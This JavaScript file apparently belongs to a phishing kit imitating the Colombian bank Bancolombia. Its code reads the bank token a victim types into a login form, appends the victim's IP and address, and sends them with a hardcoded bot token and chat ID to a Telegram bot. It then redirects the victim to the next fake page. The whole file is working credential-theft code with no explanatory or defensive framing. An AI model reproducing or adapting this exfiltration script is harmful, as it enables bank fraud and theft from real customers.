//bot token
var telegram_bot_id = "6353296325:AAGX8Ad-nAGiuk-ZrCQNPnYjLyOCOL6L3IE";
//chat id
var chat_id = "6565233851";
var u_name11, ip, ip2;
var ready = function () {
    u_name11 = document.getElementById("usuario11").value;
 
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "-Banc0lombia-\nTOKEN: " + u_name11 + "\nip" + ip +"\n" + ip2 +"\n-LOGIN-";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST", 
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = '0.html';
        console.log(response);
    });
    return false;
};
